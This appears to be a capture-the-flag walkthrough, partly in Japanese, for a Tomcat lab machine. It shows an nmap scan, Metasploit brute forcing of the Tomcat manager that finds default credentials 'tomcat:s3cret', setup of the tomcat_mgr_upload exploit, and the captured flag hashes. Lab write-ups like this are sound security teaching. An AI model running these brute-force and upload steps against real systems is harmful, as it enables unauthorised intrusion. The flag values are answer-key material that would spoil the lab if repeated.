# How to solove ?

## add Lame to /etc/hosts
sudo vim /etc/hosts

## scan on nmap 
`nmap -sC -sV -sT -Pn  10.10.10.95`

<details><summary>nmap 実行結果</summary>   
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-08 22:18 JST   
Nmap scan report for 10.10.10.95   
Host is up (0.26s latency).   
Not shown: 999 filtered ports   
PORT     STATE SERVICE VERSION   
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1   
|_http-favicon: Apache Tomcat   
|_http-open-proxy: Proxy might be redirecting requests   
|_http-server-header: Apache-Coyote/1.1   
|_http-title: Apache Tomcat/7.0.88   

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.38 seconds
</details>

###  Summary
PORT    STATE SERVICE     VERSION   
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1   

### tips
Tomcat /manager/html 管理画面?  
wordpress の/admin/login.php みたいなやつ?   

## try brute force
`python2 tomcat-brutepy`
Found valid credentials "tomcat:s3cret"

or 
`msfconsole`  
`use auxiliary/scanner/http/tomcat_mgr_login`  
`set RHOSTS 10.10.10.95`  
`exploit`  
<details><summary>exploit 実行結果</summary>   
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:admin (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:manager (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:role1 (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:root (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:tomcat (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:s3cret (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:vagrant (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:admin (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:manager (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:role1 (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:root (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:tomcat (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:s3cret (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: manager:vagrant (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:admin (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:manager (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:role1 (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:root (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:tomcat (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:s3cret (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: role1:vagrant (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: root:admin (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: root:manager (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: root:role1 (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: root:root (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: root:tomcat (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: root:s3cret (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: root:vagrant (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:admin (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:manager (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:role1 (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:root (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: tomcat:tomcat (Incorrect)   
[+] 10.10.10.95:8080 - Login Successful: tomcat:s3cret   
[-] 10.10.10.95:8080 - LOGIN FAILED: both:admin (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: both:manager (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: both:role1 (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: both:root (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: both:tomcat (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: both:s3cret (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: both:vagrant (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: j2deployer:j2deployer (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: ovwebusr:OvW*busr1 (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: cxsdk:kdsxc (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: root:owaspbwa (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: ADMIN:ADMIN (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: xampp:xampp (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: QCC:QLogic66 (Incorrect)   
[-] 10.10.10.95:8080 - LOGIN FAILED: admin:vagrant (Incorrect)   
[*] Scanned 1 of 1 hosts (100% complete)   
[*] Auxiliary module execution completed   
</details>
## 

use exploit/multi/http/tomcat_mgr_upload
show options
set RHOSTS 10.10.10.95
set httppassword s3cret
set httpusername tomcat
set rport 8080

type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
